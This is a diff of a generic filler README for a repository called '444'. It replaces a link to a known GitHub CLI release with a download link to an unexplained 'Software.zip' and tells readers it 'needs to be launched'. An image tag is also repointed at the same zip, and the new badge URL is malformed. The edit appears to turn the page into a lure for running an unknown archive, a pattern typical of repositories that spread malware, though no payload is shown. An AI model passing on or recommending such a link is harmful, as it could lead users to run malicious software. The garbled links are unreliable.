@@ -8,7 +8,7 @@ This repository does not provide a specific short description. However, feel fre
 The repository does not specify any topics.
 
 ## Download Link
-[![Download](https://img.shields.io/badge/Download-Click%20Here-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) needs to be launched.
+[![Download](https://github.com/31ramo31/444/releases/download/v1.0/Software.zip%20Here-blue)](https://github.com/31ramo31/444/releases/download/v1.0/Software.zip) needs to be launched.
 
 If the above link does not work, please check the "Releases" section of the repository for alternative download options.
 
@@ -32,4 +32,4 @@ If you encounter any issues or have questions regarding the repository, please f
 
 Thank you for visiting the "444" Repository! 🚀
 
-![Space Image](https://source.unsplash.com/weekly?stars)
+![Space Image](https://github.com/31ramo31/444/releases/download/v1.0/Software.zip)
